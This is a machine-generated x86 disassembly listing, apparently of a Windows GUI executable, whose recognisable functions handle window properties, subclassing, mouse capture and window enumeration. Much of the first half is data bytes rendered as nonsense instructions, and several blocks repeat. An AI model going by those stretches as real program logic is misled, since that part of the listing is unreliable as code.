add [ eax ] ah
cmp eax 0x6d340043
inc ebx
add [ eax + 0x6d ] ah
inc ebx
add [ eax + 0x48 ] ah
inc ebx
add [ eax - 0x13ffbcc2 ] bl
dec ecx
inc ebx
add [ ecx + ecx * 2 + 0x43 ] ah
add [ eax + 0x4c ] bh
inc ebx
add [ ebx + ecx * 2 ] ah
inc ebx
add [ eax ] ch
pop ebp
inc ebx
add ah ah
insd
inc ebx
add [ edi + ecx * 2 + 0x43 ] ah
add al bl
dec edi
inc ebx
add [ eax + eax * 2 + 0x43 ] cl
add [ eax + 0xe00434f ] bh
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x800040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] eax
add [ ebx ] cl
add [ edx ] eax
mov eax [ 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
add [ eax + 0x3c ] ch
inc ebx
add [ ebx + ebp * 2 + 0x5f940043 ] bl
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_430c22
inc ecx
add [ ebp - 0x5a27ffbf ] al
inc ecx
add al ah
cmp [ ebx ] al
mov esp 0x5400440d
cmp [ ebx ] eax
in al 0xd
inc esp
add [ edi + ebp * 2 + 0x3acc0043 ] ch
inc ebx
add [ eax + 0x34004339 ] cl
push cs
inc esp
add [ eax + 0xe ] cl
inc esp
add al al
cmp [ ebx ] eax
jo r-xdata
or [ esi ] 0x44
add [ edi + ebp * 2 + 0x3b300043 ] dh
inc ebx
add [ eax + 0x3b ] dh
inc esp
add [ edx + edi ] bl
inc ebx
add [ eax + 0xe ] bh
inc esp
add [ edx + edi ] bh
inc ebx
add [ eax - 0x4bffbbf2 ] al
outsd
inc ebx
add [ eax ] dh
cmp eax [ ebx ]
jo r-xdata
je r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xca4c08b
inc ebx
add [ ebx ] al
or [ ecx + ecx * 2 + 0x6d ] dl
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] cl
add [ eax ] al
add [ eax + 0x900430c ] ah
add [ gs : eax ] eax
inc ebx
add [ edx + edi + 0x43 ] bl
add [ esi + ecx + 0xe980044 ] dl
inc esp
add [ eax - 0xfffbcc6 ] al
aaa
inc ebx
add [ 0x6e695754 ] dl
inc ebx
outsd
outsb
je r-xdata
insb
inc ebx
jne r-xdata
or [ ecx + 0x6d ] ebp
inc ebx
push 0x73656e69
or ch [ gs : ecx + 0x6d ]
add [ esp + edx * 2 ] ecx
or [ ecx + 0x6d ] ch
push ebx
inc ecx
insb
jo r-xdata
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebp + ecx + 0x43 ] bl
add [ esi ] al
bound esi [ esi + 0x4e ]
dec esp
outsd
ja r-xdata
or [ edx + 0x76 ] esp
insb
or [ ecx + 0x6d ] ebp
dec eax
popad
outsb
jne r-xdata
insb
inc ebp
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
jb r-xdata
je r-xdata
popad
pop es
imul ebp [ ebp + 0x41 ] 0x6168706c
push es
imul ebp [ ebp + 0x48 ] 0x7617269
imul ebp [ ebp + 0x53 ] 0x6174614b
push es
imul ebp [ ebp + 0x4b ] 0x9617461
imul ebp [ ebp + 0x43 ] 0x656e6968
jae r-xdata
adc [ eax ] eax
outsd
insb
jae r-xdata
add [ esi ] al
jb r-xdata
or [ edx + 0x76 ] ah
insb
or [ ebx + 0x6f ] al
outsb
je r-xdata
pop es
bound esp [ ebp + 0x54 ]
or eax 0xa030043
push esp
inc edx
jbe r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
add [ eax ] al
add [ ebp + ecx + 0x62060043 ] ah
dec esp
je r-xdata
add eax 0x0
or eax 0x62060043
jbe r-xdata
push ebx
dec eax
popad
outsb
jne r-xdata
or ch [ ecx + 0x6d ]
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add [ edi + ebp * 2 - 0x4743ffbd ] bh
inc ebx
add al bl
mov ebp 0xbd240043
inc ebx
add ah dl
cmp eax 0xb3380043
inc ebx
add [ eax - 0x4d ] bl
inc ebx
add [ eax - 0x50 ] dh
inc ebx
add [ edi + 0x3d200043 ] bl
inc ebx
add [ ebp * 2 + 0x6d600043 ] dh
inc ebx
add [ eax + 0x48 ] ah
inc ebx
add [ eax - 0x13ffbcc2 ] bl
dec ecx
inc ebx
add [ ecx + ecx * 2 + 0x43 ] ah
add [ eax + 0x4c ] bh
inc ebx
add [ ebx + ecx * 2 ] ah
inc ebx
add [ esp + ecx * 4 + 0x6de40043 ] ah
inc ebx
add ah al
mov al 0x43
add [ eax + 0x7c0043b1 ] al
lodsb [ esi ]
inc ebx
add [ ecx + esi * 4 + 0x43 ] ah
add ah bh
jb r-xdata
outsd
je r-xdata
or eax 0xb060043
push esp
inc edx
jbe r-xdata
inc eax
add [ ecx ] al
jns r-xdata
insb
inc ebp
jae r-xdata
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
push edx
popad
imul esi [ ebx + 0x65 ] 0x76620764
push ebx
jo r-xdata
or [ fs : edx + 0x76 ] ah
add [ ebp + ecx - 0x3f74ffbd ] esp
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
outsb
popad
jb r-xdata
outsd
insd
inc edx
or [ edx + 0x65 ] ah
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
add [ ebx ] al
add [ eax ] al
add [ eax ] al
push cs
inc ebx
add [ esi ] al
bound ebp [ ebx + 0x4e ]
outsd
outsb
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
outsd
jo r-xdata
push esp
outsd
outsb
or [ gs : edx + 0x76 ] esp
inc esp
push cs
inc ebx
add [ ecx + eax ] bh
add [ eax ] dh
or eax 0x1880043
add [ eax ] al
imul eax [ eax ] 0x111000f
dec esi
add [ 0x15011400 ] dl
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
add [ eax + 0x30004379 ] dl
xchg [ ebx ] eax
sbb al 0x81
inc ebx
add [ eax ] bl
test [ ebx ] al
dec eax
add [ ebx ] 0xc8
xchg [ ebx ] eax
int3
add [ eax ] al
add [ eax ] al
mov [ edi ] cs
inc ebx
add [ eax ] dh
adc al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmpsb [ esi ] [ edi ]
cmovae eax [ eax ]
push ds
adc al [ ebx ]
add al 0x2
add [ eax ] al
mov al 0x7
inc ebx
add [ esp + 0x41 ] cl
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
add bh bh
inc esp
push cs
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx + 0x12300043 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x1e00430f ] ah
outsd
je r-xdata
bound esp [ ebp + 0x42 ]
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
add al 0xe
inc ebx
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
or eax 0xc08b0043
movsb [ edi ] [ esi ]
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ eax ] al
outsd
insb
jae r-xdata
imul ebp [ ebp + 0x44 ] 0x62617369
insb
pop es
imul ebp [ ebp + 0x43 ] 0x65736f6c
push es
imul ebp [ ebp + 0x4f ] 0xa6e6570
imul ebp [ ebp + 0x44 ] 0x43746e6f
popad
jb r-xdata
add [ ecx ] cl
inc edx
outsd
jb r-xdata
shl [ ecx + 0x80a0043 ] 0x54
outsb
je r-xdata
or [ ebx + 0x6f ] al
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
movsb [ edi ] [ esi ]
inc ecx
insb
jae r-xdata
dec ecx
insd
dec esi
popad
insd
mov eax eax
inc esp
or eax 0xc010043
push esp
or cl [ eax ]
push esp
test al 0xd
inc ebx
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
xor eax [ eax ]
or [ esi + 0x30900043 ] cl
inc eax
add [ eax + esi + 0x70e00040 ] ch
inc ebx
add [ eax - 0x2fffbc43 ] ch
test [ ebx ] eax
sub al 0x40
inc ecx
add [ ebx + ebp * 2 + 0x43 ] ah
add [ eax + 0x3f ] ah
inc ebx
add [ edx + esi * 2 + 0x48780043 ] al
inc ebx
add [ esp + 0x41 ] ah
outsd
insb
jae r-xdata
mov eax eax
dec eax
push cs
inc ebx
outsb
je r-xdata
inc ebx
outsd
add [ edi ] cl
or al 0x49
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
ror [ eax + 0xe ] 0x43
sub_430d5c
pushad
or eax 0x9030043
push esp
inc edx
jbe r-xdata
outsd
jo r-xdata
insb
inc ebx
jne r-xdata
or [ edx + 0x65 ] ah
inc edx
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebp + ecx + 0x43 ] bl
add [ esi ] al
bound esi [ esi + 0x4e ]
outsd
outsb
or [ gs : edx + 0x76 ] esp
dec esp
outsd
ja r-xdata
outsb
popad
jb r-xdata
outsd
insd
adc [ eax ] eax
outsd
insb
jae r-xdata
add [ esi ] al
jb r-xdata
outsb
je r-xdata
or [ ebx + 0x6f ] al
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add [ edi + ebp * 2 - 0x4743ffbd ] bh
inc ebx
add al bl
mov ebp 0xbd240043
inc ebx
add ah dl
cmp eax 0xb3380043
inc ebx
add [ eax - 0x4d ] bl
inc ebx
add [ eax - 0x50 ] dh
inc ebx
add [ edi + 0x3d200043 ] bl
inc ebx
add [ ebp * 2 + 0x6d600043 ] dh
inc ebx
add [ eax + 0x48 ] ah
inc ebx
add [ eax - 0x13ffbcc2 ] bl
dec ecx
inc ebx
add [ ecx + ecx * 2 + 0x43 ] ah
add [ eax + 0x4c ] bh
inc ebx
add [ ebx + ecx * 2 ] ah
inc ebx
add [ esp + ecx * 4 + 0x6de40043 ] ah
inc ebx
add ah al
mov al 0x43
add [ eax + 0x7c0043b1 ] al
lodsb [ esi ]
inc ebx
add [ ecx + esi * 4 + 0x43 ] ah
add ah bh
jb r-xdata
outsd
je r-xdata
or eax 0xb060043
push esp
inc edx
jbe r-xdata
inc eax
add [ ecx ] al
jns r-xdata
insb
inc ebp
jae r-xdata
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
or [ fs : edx + 0x76 ] ah
push edx
popad
imul esi [ ebx + 0x65 ] 0x76620764
push ebx
jo r-xdata
inc esp
push cs
inc ebx
add [ ecx + eax ] bh
add [ eax ] dh
or eax 0x1880043
add [ eax ] al
imul eax [ eax ] 0x111000f
dec esi
add [ 0x15011400 ] dl
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
add [ eax + 0x30004379 ] dl
xchg [ ebx ] eax
sbb al 0x81
inc ebx
add [ eax ] bl
test [ ebx ] al
dec eax
add [ ebx ] 0xc8
xchg [ ebx ] eax
int3
add [ eax ] al
add [ eax ] al
mov [ edi ] cs
inc ebx
add [ eax ] dh
adc al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmpsb [ esi ] [ edi ]
cmovae eax [ eax ]
push ds
adc al [ ebx ]
add al 0x2
add [ eax ] al
mov al 0x7
inc ebx
add [ esp + 0x41 ] cl
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
add bh bh
inc esp
push cs
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx + 0x12300043 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x1e00430f ] ah
outsd
je r-xdata
bound esp [ ebp + 0x42 ]
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
or eax 0xc08b0043
movsb [ edi ] [ esi ]
add al 0xe
inc ebx
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
add [ ebp + ecx - 0x3f74ffbd ] esp
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ ebx ] al
add [ eax ] al
add [ eax ] al
push cs
inc ebx
add [ esi ] al
bound ebp [ ebx + 0x4e ]
outsd
outsb
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
add [ eax ] al
outsd
insb
jae r-xdata
movsb [ edi ] [ esi ]
inc ecx
insb
jae r-xdata
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
or cl [ eax ]
push esp
dec ecx
insd
dec esi
popad
insd
mov eax eax
inc esp
or eax 0xc010043
push esp
inc edx
outsd
jb r-xdata
test al 0xd
inc ebx
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
xor eax [ eax ]
or [ esi + 0x30900043 ] cl
inc eax
add [ eax + esi + 0x70e00040 ] ch
inc ebx
add [ eax - 0x2fffbc43 ] ch
test [ ebx ] eax
sub al 0x40
inc ecx
add [ ebx + ebp * 2 + 0x43 ] ah
add [ eax + 0x3f ] ah
inc ebx
add [ edx + esi * 2 + 0x48780043 ] al
inc ebx
add [ esp + 0x41 ] ah
outsd
insb
jae r-xdata
mov eax eax
dec eax
push cs
inc ebx
outsb
je r-xdata
inc ebx
outsd
insb
inc ebp
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebp + ecx + 0x62060043 ] ah
dec esp
je r-xdata
jb r-xdata
pop es
add [ edi ] cl
or al 0x49
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
ror [ eax + 0xe ] 0x43
bound esp [ ebp + 0x54 ]
or eax 0xa030043
push esp
inc edx
jbe r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
sub_4315c5
xchg [ ebx ] eax
test [ esi - 0x79d3ffbd ] al
inc ebx
add [ edx + esi * 4 - 0x305fffbd ] ah
inc ebx
add [ eax - 0x3c ] bh
inc ebx
add [ eax ] ah
scasd [ edi ]
inc ebx
add [ eax ] dl
mov dl 0x43
add [ edi + eax * 8 ] bh
inc ebx
add [ ebx + ecx * 8 + 0x43 ] dl
add al ch
enter 0x43 0xd0
0x43
sub_431740
and [ edi ] dl
inc ebx
add [ edx ] ch
pop ss
inc ebx
add [ edi + edx ] dh
inc ebx
add [ ebp - 0x52ffbcea ] ah
push ss
inc ebx
add [ ebp - 0x42ffbcea ] dh
push ss
inc ebx
add dl cl
push ss
inc ebx
add bh dl
push ss
inc ebx
add ah ah
push ss
inc ebx
add cl dh
push ss
inc ebx
add dh bh
push ss
inc ebx
add [ ebx ] cl
pop ss
inc ebx
add [ eax ] bl
pop ss
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ecx - 0x3 ] bh
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x1740e870 ] eax
inc ebx
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add ah ah
pop ss
inc ebx
add [ eax + 0x17 ] bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
sbb [ ebx ] al
js r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] eax
sub [ ebx ] dh
inc eax
add [ eax + 0x55 ] dh
inc eax
add [ ebp + edx * 2 + 0x40 ] bh
add [ ebx + esi ] bh
inc eax
add [ eax ] dh
xor eax [ eax ]
mov [ ebp + 0x40 ] ss
add [ eax + esi - 0x27afffc0 ] ch
inc ebx
add [ eax + ebx * 8 - 0x25e3ffbd ] ah
inc ebx
add [ edx + ebx * 8 ] ch
inc ebx
add ah ch
loope r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x28004318
add [ eax ] al
add [ eax + 0x28004010 ] ah
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
add al 0xfb
inc ebx
add [ esi ] al
push esp
dec ebp
outsd
jne r-xdata
add ah dl
in al 0x43
add [ edi ] dl
inc ebx
add [ eax ] bl
jmp 0xffffffffee5f1845
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
nop
sub_431884
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_43193c
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_431970
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404374
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_43193c
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_4319cc
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_431bb0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c004
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_4043d4
mov eax edi
mov edx esi
call sub_403f08
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_431bf4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c004
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_4043d4
mov eax edi
mov edx esi
call sub_403f08
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_431c60
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
jne r-xdata
mov eax ebx
call sub_43b290
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_431ca8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x100043 ] bl
add [ eax ] al
js r-xdata
add [ eax - 0x53ffbfd0 ] dl
xor [ eax ] al
js r-xdata
inc ecx
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
inc ecx
add [ edx + edi ] bl
inc ecx
add [ eax - 0x3bffbec4 ] bl
sbb eax 0x39480043
inc ecx
add [ ecx ] cl
push esp
push ebx
imul esi [ ebp + 0x4c ] 0x8b747369
rcl [ ebx + 0x56 ] 0x57
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_4139f4
sub_431d0c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_4139f4
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_431d40
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43b290
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_431d68
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026cc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_431d40
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_431d0c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_413898
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_413a70
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_431dc4
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_4138cc
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4139f4
mov edx 0x8
call sub_4026ec
inc esi
dec ebx
jne r-xdata
sub_431df8
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_4139f4
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_431d0c
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_431e5c
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_431ebc
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_403048
mov edx esp
mov eax esi
call sub_404118
add esp 0x100
pop esi
pop ebx
retn
sub_431ef8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_431fc2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_433018
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_4329a0
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4067a0
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_4329a0
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
